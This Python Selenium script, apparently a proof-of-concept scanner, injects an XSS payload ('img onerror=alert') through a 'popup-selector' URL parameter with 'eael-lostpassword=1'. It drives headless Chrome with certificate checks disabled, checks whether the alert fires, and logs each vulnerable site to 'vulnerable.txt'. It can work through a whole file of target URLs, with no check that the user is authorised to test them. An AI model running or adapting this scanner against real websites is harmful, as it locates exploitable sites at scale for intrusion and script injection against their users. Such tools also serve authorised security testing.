import sys
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.chrome.service import Service
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.alert import Alert
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException, UnexpectedAlertPresentException, NoAlertPresentException, WebDriverException
#By Chirag Artani
def check_xss(url):
    # Configure Chrome options
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--ignore-certificate-errors")
    chrome_options.add_argument("--ignore-ssl-errors")
    
    # Create payload URL
    payload_url = f"{url}?popup-selector=%3Cimg_src=x_onerror=alert(%22chirgart%22)%3E&eael-lostpassword=1"
    
    # Initialize the WebDriver with webdriver-manager
    try:
        driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()), options=chrome_options)
        driver.set_page_load_timeout(10)  # 10 seconds timeout for page load
    except Exception as e:
        print(f"[ERROR] Failed to initialize WebDriver: {e}")
        return False
    
    try:
        print(f"Testing URL: {payload_url}")
        
        # Navigate to the page
        try:
            driver.get(payload_url)
        except Exception as e:
            print(f"[ERROR] Failed to load page: {e}")
            return False
        
        # Wait for a few seconds for any JavaScript to execute
        time.sleep(2)
        
        # Check if an alert is present
        try:
            WebDriverWait(driver, 3).until(EC.alert_is_present())
            alert = driver.switch_to.alert
            alert_text = alert.text
            alert.accept()
            
            if "chirgart" in alert_text:
                print(f"[VULNERABLE] XSS confirmed on {url}")
                with open("vulnerable.txt", "a") as f:
                    f.write(f"{url}\n")
                return True
        except (TimeoutException, NoAlertPresentException):
            print(f"[NOT VULNERABLE] No XSS alert detected on {url}")
            return False
        except UnexpectedAlertPresentException:
            print(f"[VULNERABLE] XSS confirmed on {url} (unexpected alert)")
            with open("vulnerable.txt", "a") as f:
                f.write(f"{url}\n")
            return True
            
    except WebDriverException as e:
        print(f"[ERROR] WebDriver error: {e}")
        return False
    except Exception as e:
        print(f"[ERROR] Unexpected error: {e}")
        return False
    finally:
        # Clean up
        try:
            driver.quit()
        except:
            pass
    
    return False

if __name__ == "__main__":
    # Check if file with URLs is provided as argument
    if len(sys.argv) < 2:
        print("Usage: python check.py <url_or_file>")
        sys.exit(1)
    
    input_arg = sys.argv[1]
    
    # Check if the argument is a file
    if input_arg.endswith('.txt'):
        # Process URLs from file
        try:
            with open(input_arg, "r") as f:
                urls = [line.strip() for line in f.readlines() if line.strip()]
            
            print(f"Loaded {len(urls)} URLs to test")
            
            vulnerable_count = 0
            error_count = 0
            
            for i, url in enumerate(urls):
                # Remove trailing slash if present
                if url.endswith("/"):
                    url = url[:-1]
                
                print(f"[{i+1}/{len(urls)}] Testing: {url}")
                
                try:
                    is_vulnerable = check_xss(url)
                    
                    if is_vulnerable:
                        vulnerable_count += 1
                except Exception as e:
                    print(f"[ERROR] Failed to test {url}: {e}")
                    error_count += 1
                
                # Add a small delay between requests
                time.sleep(0.5)
            
            print(f"\nCompleted testing {len(urls)} URLs")
            print(f"Found {vulnerable_count} vulnerable sites (saved to vulnerable.txt)")
            print(f"Encountered errors on {error_count} sites")
            
        except Exception as e:
            print(f"Error processing file: {e}")
    else:
        # Process single URL
        url = input_arg
        if url.endswith("/"):
            url = url[:-1]
        
        check_xss(url)
